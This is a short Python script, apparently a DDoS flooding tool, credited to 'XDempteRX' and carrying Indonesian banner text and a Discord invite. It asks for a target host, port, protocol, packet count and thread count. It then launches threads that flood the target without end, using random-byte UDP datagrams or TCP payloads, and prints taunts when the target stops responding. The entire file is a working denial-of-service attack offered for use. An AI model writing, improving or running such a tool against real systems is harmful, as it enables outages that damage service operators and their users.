#!/usr/bin/env python3
#Code By XDempteRX
import random
import socket
import threading

print("===> C0de By XDempteRX <===")
print("===> Tools XDempteRX V1 <===")
print("===> KUY JOIN: https://discord.gg/FUgcMMF8eR <===")
print("===> TOOLS INI DILARANG SEMBARANG PAKE <===")
print("===> PENGEN RENAME, REMAKE, PM ME DI LINK DC ATAS <===")
ip = str(input(" HOST/IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" GASS DI SERANG?(y/n):"))
times = int(input(" PACKETS DDOS:"))
threads = int(input(" THREADS DDOS:"))
def run():
	data = random._urandom(9904)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Packets Sent To Server!!!")
		except:
			print("[!] Mampus Udh Knock!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Packets Sent To Server!!!")
		except:
			s.close()
			print("[*] Mampus Udh Knock")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
